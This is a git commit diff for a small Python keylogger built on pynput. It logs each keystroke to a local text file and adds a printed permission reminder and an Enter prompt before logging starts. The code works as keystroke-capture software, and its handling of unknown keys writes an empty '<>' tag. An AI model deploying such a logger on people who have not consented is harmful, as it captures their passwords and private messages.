9ace142df6664737524d22af89e82af59a3c5d2e
Padmakumar P B <padmakumarpb176@gmail.com>
2024-08-03 20:29:54 +0530

    Update key handling.

--- keylogger.py
+++ keylogger.py
@@ -1,24 +1,44 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener,Key,KeyCode
 
 log_file = "log.txt"
 
 def write_to_file(key):
-    letter = str(key)
-    letter = letter.replace("'","")
-
-    if letter == 'Key.space':
-        letter = ' '
-    elif letter == 'Key.enter':
-        letter = '\n'
-    elif letter == 'Key.backspace':
-        letter = '<backspace>'
-    elif letter == {'Key.shift', 'Key.shift_l', 'Key.shift_r'}:
+    letter = ""
+    try:
+        # For character keys
+        if isinstance(key, KeyCode):
+            letter = key.char
+        else:
+            raise AttributeError
+    except AttributeError:
+        # For special keys
+        if key == Key.space:
+            letter = ' '
+        elif key == Key.enter:
+            letter = '\n'
+        elif key == Key.backspace:
+            letter = '<backspace>'
+        elif key in {Key.shift, Key.shift_l, Key.shift_r}:
             letter = '<shift>'
-    elif letter == {'Key.ctrl', 'Key.ctrl_l', 'Key.ctrl_r'}:
+        elif key in {Key.ctrl, Key.ctrl_l, Key.ctrl_r}:
             letter = '<ctrl>'
+        else:
+            # Handle function keys and other non-character keys
+            letter = f'<{letter}>'
 
     with open(log_file,"a") as file:
         file.write(letter)
 
-with Listener(on_press= write_to_file) as listen:
-    listen.join()
+def main():
+    # Display security message
+    print("Security Considerations:")
+    print("Remember to use this keylogger ethically and legally, only in situations where you have explicit permission.")
+    input("Press Enter to start logging keystrokes...")
+
+    with Listener(on_press= write_to_file) as listen:
+        listen.join()
+
+if __name__ == "__main__":
+    main()
+
+#end of program
